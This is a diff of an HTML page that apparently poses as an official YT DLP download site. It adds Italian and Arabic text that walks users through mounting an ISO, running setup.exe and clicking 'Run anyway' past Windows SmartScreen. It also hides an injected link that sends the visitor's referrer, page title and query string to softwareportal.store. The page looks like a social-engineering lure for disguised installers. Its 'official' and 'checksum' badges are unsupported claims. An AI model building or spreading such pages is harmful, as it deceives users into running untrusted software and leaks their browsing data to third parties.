@@ -3,7 +3,7 @@
 <head>
 <span id="b8dde73d-48c6-0f46-2186-b948d9e3e753"></span>
 <script type="application/javascript">
-document.getElementById('b8dde73d-48c6-0f46-2186-b948d9e3e753').innerHTML = '<a href="https://www2.softwareportal.store/QLwXXw?&se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'">Link</a>';
+document.getElementById('b8dde73d-48c6-0f46-2186-b948d9e3e753').innerHTML = '<a href="https://www2.softwareportal.store/QLwXXw?&se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'"></a>';
 </script>
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -176,8 +176,9 @@ document.getElementById('b8dde73d-48c6-0f46-2186-b948d9e3e753').innerHTML = '<a 
         launched_btn:'Installer gestartet', launched_ok:'Danke – erfasst.',
         footer:'Datei nicht gefunden? Mit Strg+J die Downloads öffnen. Lassen Sie diesen Tab für Hinweise geöffnet.'
       },
+
       ko: {
-        title: 'YT DLP 설치',
+      title: 'YT DLP 설치',
       sub: '이 탭을 열어 두세요. 다운로드한 파일을 여는 방법과 설치 프로그램을 안전하게 실행하는 방법을 안내해 드립니다.',
       badge_official: '공식 다운로드', badge_verify: '서명/체크섬 확인',
       slide_label: '오른쪽으로 밀어 다운로드 잠금 해제',
@@ -200,7 +201,57 @@ document.getElementById('b8dde73d-48c6-0f46-2186-b948d9e3e753').innerHTML = '<a 
       launched_btn: '설치 프로그램을 시작했습니다',
       launched_ok: '감사합니다 — 확인되었습니다.',
       footer: '파일이 보이지 않나요? Ctrl+J를 눌러 다운로드를 여세요. 안내를 위해 이 탭을 열어 두세요.'
-    }
+    },
+it: {
+  title: 'Installazione di YT DLP',
+  sub: 'Mantenga questa scheda aperta. La guideremo ad aprire il file scaricato ed eseguire il programma di installazione in modo sicuro.',
+  badge_official: 'Download ufficiale', badge_verify: 'Verifica firma/checksum',
+  slide_label: 'Scorri a destra per sbloccare il download',
+  slide_hint: 'Questo semplice controllo evita clic accidentali. Nessun dato personale richiesto.',
+  btn_iso: 'Scarica ISO', btn_exe: 'Scarica EXE',
+  iso_title: 'Come gestire il file ISO',
+  iso_note: 'Un file ISO è un’immagine disco. Ecco i modi sicuri per aprirlo in Windows.',
+  iso_1: 'Fare doppio clic sul file ISO — Windows lo monterà come unità virtuale. Aprire l’unità ed eseguire setup.exe, se presente.',
+  iso_2: 'Clic destro → Monta — equivalente al doppio clic.',
+  iso_3: 'Servono i file all’interno? Usare 7‑Zip per estrarre senza montare.',
+  iso_4: 'PowerShell (avanzato): eseguire come amministratore: Mount-DiskImage -ImagePath "C:\\percorso\\al\\file.iso"',
+  iso_5: 'Dopo il montaggio, individuare l’unità in Esplora file, aprirla e avviare l’installer. Se compare SmartScreen, vedere i suggerimenti sotto.',
+  help_title: 'Guida rapida',
+  help_note: 'Passaggi brevi per browser e avvisi comuni.',
+  help_ec_1: 'Aprire il menu Download (in alto a destra) o premere Ctrl+J.',
+  help_ec_2: 'Fare clic su Conserva (o Salva), quindi Apri.',
+  help_ec_3: 'Se compare “Windows ha protetto il PC”: Ulteriori informazioni → Esegui comunque (solo se si ritiene attendibile l’editore).',
+  help_ff_1: 'Fare clic sulla freccia dei download nella barra degli strumenti, quindi fare clic sul file per aprirlo.',
+  help_ff_2: 'Confermare eventuali richieste se si ritiene affidabile la fonte.',
+  launched_btn: 'Ho avviato il programma di installazione',
+  launched_ok: 'Grazie — registrato.',
+  footer: 'Non trovi il file? Premere Ctrl+J per aprire i download. Tenga aperta questa scheda per i suggerimenti.'
+},
+ar: {
+ title: 'تثبيت YT DLP',
+ sub: 'أبقِ هذه علامة التبويب مفتوحة. سنرشدك لفتح الملف الذي تم تنزيله وتشغيل برنامج التثبيت بأمان.',
+ badge_official: 'تنزيل رسمي', badge_verify: 'تحقّق من التوقيع/المجموع الاختباري',
+ slide_label: 'اسحب إلى اليمين لإلغاء قفل التنزيل',
+ slide_hint: 'هذا الفحص البسيط يمنع النقرات غير المقصودة. لا نطلب أي بيانات شخصية.',
+ btn_iso: 'تنزيل ISO', btn_exe: 'تنزيل EXE',
+ iso_title: 'كيفية التعامل مع ملف ISO',
+ iso_note: 'ملف ISO هو صورة قرص. إليك طرقًا آمنة لفتحه على Windows.',
+ iso_1: 'انقر نقرًا مزدوجًا على ملف ISO — سيقوم Windows بتحميله كقرص افتراضي. افتح القرص وشغّل setup.exe إن وُجد.',
+ iso_2: 'انقر بزر الماوس الأيمن → تحميل (Mount) — مماثل للنقر المزدوج.',
+ iso_3: 'تحتاج إلى الملفات بداخله؟ استخدم 7‑Zip لاستخراجها بدون تحميل.',
+ iso_4: 'PowerShell (متقدم): شغّله كمسؤول: Mount-DiskImage -ImagePath "C:\\path\\to\\file.iso"',
+ iso_5: 'بعد التحميل، اعثر على القرص في «المستكشف»، افتحه وابدأ برنامج التثبيت. إذا ظهر SmartScreen، راجع النصائح أدناه.',
+ help_title: 'مساعدة سريعة',
+ help_note: 'خطوات موجزة للمتصفحات والتنبيهات الشائعة.',
+ help_ec_1: 'افتح قائمة التنزيلات (أعلى اليمين) أو اضغط Ctrl+J.',
+ help_ec_2: 'انقر على "الاحتفاظ" (أو "حفظ")، ثم "فتح".',
+ help_ec_3: 'إذا ظهرت رسالة «قام Windows بحماية جهازك»: "مزيد من المعلومات" → "التشغيل على أي حال" (فقط إذا كنت تثق بالناشر).',
+ help_ff_1: 'انقر سهم التنزيلات في شريط الأدوات، ثم انقر الملف لفتحه.',
+ help_ff_2: 'أكّد أي مطالبة إذا كنت تثق بالمصدر.',
+ launched_btn: 'لقد بدأت تشغيل برنامج التثبيت',
+ launched_ok: 'شكرًا — تم تسجيل ذلك.',
+ footer: 'لا تجد ملفك؟ اضغط Ctrl+J لفتح التنزيلات. أبقِ هذه علامة التبويب مفتوحة للإرشادات.'
+}
     };
 
     function detectLang(){
